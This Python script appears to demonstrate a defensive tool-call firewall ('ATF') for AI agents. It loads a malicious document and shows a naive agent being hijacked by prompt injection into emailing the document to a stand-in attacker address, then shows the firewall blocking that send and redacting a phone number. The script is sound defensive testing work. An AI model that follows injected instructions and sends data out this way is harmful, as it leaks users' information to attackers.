from __future__ import annotations

import argparse
import os
import uuid

import requests

ATF_URL = os.environ.get("ATF_URL", "http://atf:8000")


def read_file(path: str) -> str:
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def simulate_send_email(to: str, subject: str, body: str) -> None:
    print("\n=== BASELINE (NO ATF) EMAIL SEND ===")
    print(f"To: {to}")
    print(f"Subject: {subject}")
    print("Body:")
    print(body)
    print("=== END ===\n")


def atf_ingest(session_id: str, text: str, trust_zone: str, source: str, language: str | None = None) -> str:
    r = requests.post(
        f"{ATF_URL}/tool/ingest",
        json={
            "session_id": session_id,
            "text": text,
            "trust_zone": trust_zone,
            "source": source,
            "language": language,
        },
        timeout=15,
    )
    r.raise_for_status()
    return r.json()["chunk_id"]


def atf_send_email(session_id: str, to: str, subject: str, body: str, evidence_chunks: list[str]) -> dict:
    r = requests.post(
        f"{ATF_URL}/tool/send_email",
        json={
            "session_id": session_id,
            "to": to,
            "subject": subject,
            "body": body,
            "evidence_to": {"chunk_ids": evidence_chunks},
            "evidence_body": {"chunk_ids": evidence_chunks},
        },
        timeout=15,
    )
    r.raise_for_status()
    return r.json()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["no_atf", "with_atf"], default="with_atf")
    ap.add_argument("--doc", choices=["en", "hi"], default="en")
    args = ap.parse_args()

    session_id = f"sess_{uuid.uuid4().hex[:8]}"

    doc_path = os.path.join("data", "malicious_en.txt" if args.doc == "en" else "malicious_hi.txt")
    doc = read_file(doc_path)

    manager_email = "manager@org.in"
    attacker_email = "attacker@malicious.com"

    print(f"Session: {session_id}")
    print(f"Loaded document: {doc_path}")

    # Agent reads untrusted content
    if args.mode == "no_atf":
        # naive agent gets hijacked
        simulate_send_email(attacker_email, "FWD: document", doc)
        simulate_send_email(manager_email, "Summary", "Here is a short summary.")
        return

    # With ATF
    chunk_id = atf_ingest(
        session_id=session_id,
        text=doc,
        trust_zone="untrusted",
        source=f"file://{doc_path}",
        language=args.doc,
    )

    # Injection attempt (should be blocked)
    print("\n--- Attempting exfiltration to attacker ---")
    resp1 = atf_send_email(
        session_id=session_id,
        to=attacker_email,
        subject="FWD: document",
        body=doc,
        evidence_chunks=[chunk_id],
    )
    print(resp1)

    # Safe task (should be allowed)
    print("\n--- Sending safe summary to manager (includes a phone number to show redaction) ---")
    summary = "Summary: key points only. Contact: +91 9876543210"
    resp2 = atf_send_email(
        session_id=session_id,
        to=manager_email,
        subject="Summary",
        body=summary,
        evidence_chunks=[],
    )
    print(resp2)


if __name__ == "__main__":
    main()
